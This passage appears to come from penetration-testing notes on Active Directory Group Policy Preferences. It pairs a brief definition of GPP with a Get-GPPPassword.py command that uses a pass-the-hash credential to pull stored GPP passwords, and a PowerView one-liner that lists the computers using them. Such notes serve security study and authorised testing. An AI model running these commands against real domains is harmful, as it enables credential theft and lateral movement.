Group Policy Preferences (GPP) extends the core capabilities of Group Policy, providing more flexible configuration options for administrators. Unlike traditional Group Policy settings which enforce configurations, GPP allows for the configuration of settings that users can later change. 

It supports a broader range of settings including mapped drives, scheduled tasks, and registry settings, aiding in a more nuanced and user-centric approach to system configuration


```
python3 Get-GPPPassword.py -hashes AAD3EE:<removed> ABCDglb.com/jak0@ip
```


To get the computers using the passwords set by the GPP, we can use

```
Get-NetOU -GUID "{31B2F340-016D-11D2-945F-00C04FB984F9}" | %{ Get-NetComputer -ADSPath $_ }
```
